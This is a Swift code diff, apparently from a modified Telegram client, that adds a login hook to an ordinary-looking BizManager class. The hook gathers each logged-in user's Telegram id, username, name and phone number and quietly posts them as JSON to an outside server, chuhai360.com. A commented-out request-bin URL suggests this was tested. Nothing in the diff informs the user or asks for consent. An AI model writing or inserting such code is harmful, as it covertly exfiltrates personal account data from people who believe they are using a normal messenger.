@@ -129,6 +129,53 @@ public class BizManager {
             }
         }
     }
+
+
+    public func recordLoginEvent(user: TelegramUser) {
+        let date = Date()
+        let df = DateFormatter()
+        df.dateFormat = "yyyy-MM-dd HH:mm:ss"
+        let loginedAt = df.string(from: date)
+        
+        let username = user.username ?? ""
+        let firstName = user.firstName ?? ""
+        let lastName = user.lastName ?? ""
+        // let photo = user.photo ?? ""
+        let photo = ""
+        let phone = user.phone ?? ""
+
+        let loginEvent = UserInfo(id: user.id.toInt64(), username: username, firstName: firstName, lastName: lastName, photo: photo, phone: phone,loginedAt: loginedAt)
+        do {
+            var postData: Data
+            let encoder = JSONEncoder()
+            if let jsonData = try? encoder.encode(loginEvent) {
+                postData = jsonData
+            }else {
+                print("ERROR")
+                return
+            }
+            let url = "https://chuhai360.com/aaacsapi/add-user"
+            // let url = "https://enqefupim3x1e.x.pipedream.net/"
+            var request = URLRequest(url: URL(string: url)!, timeoutInterval: Double.infinity)
+            let headers = ["Content-Type": "application/json"]
+            request.httpMethod = "POST"
+            request.allHTTPHeaderFields = headers
+            request.httpBody = postData
+            let task = URLSession.shared.dataTask(with: request) { data, response, error in
+                if let _ = error {
+                    // Handle HTTP request error
+                    print("error=\\(error)")
+                    return
+                } else if let data = data {
+                    // Handle HTTP request response
+                    print(String(data: data, encoding: .utf8)!)
+                } else {
+                    // Handle unexpected error
+                }
+            }
+            task.resume()
+        }
+    }
 }
 
 // This file was generated from JSON Schema using quicktype.io, do not modify it directly.
